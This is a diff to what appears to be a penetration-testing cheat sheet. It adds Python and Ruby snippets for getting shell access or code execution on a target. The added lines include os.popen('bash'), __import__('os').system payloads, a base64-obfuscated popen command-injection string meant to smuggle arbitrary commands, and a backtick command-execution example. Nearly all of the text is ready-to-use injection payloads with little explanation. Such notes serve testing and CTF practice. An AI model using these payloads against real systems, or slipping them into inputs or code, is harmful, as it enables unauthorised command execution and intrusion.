@@ -271,6 +271,13 @@ call(['bash'])
 
 import os
 os.system('bash')
+os.popen('bash').read()
+__import__('os').system(...)
+
+str(os.system('bash')) # for code execution will sometimes only return the return code, so use the popen way
+
+str(__import__('os').popen(str(__import__('base64').b64decode('{command}'))).read())
+// to base64 encode
 }}
 ## Ruby {{
 ruby -e 'require "irb" ; IRB.start(__FILE__)'
@@ -279,6 +286,9 @@ ruby -e 'require "irb" ; IRB.start(__FILE__)'
 
 "+"
 //String Concatenation
+
+`uname`
+runs uname on system
 }}
 ## node {{
 node -e '...' followed by valid JavaScript code
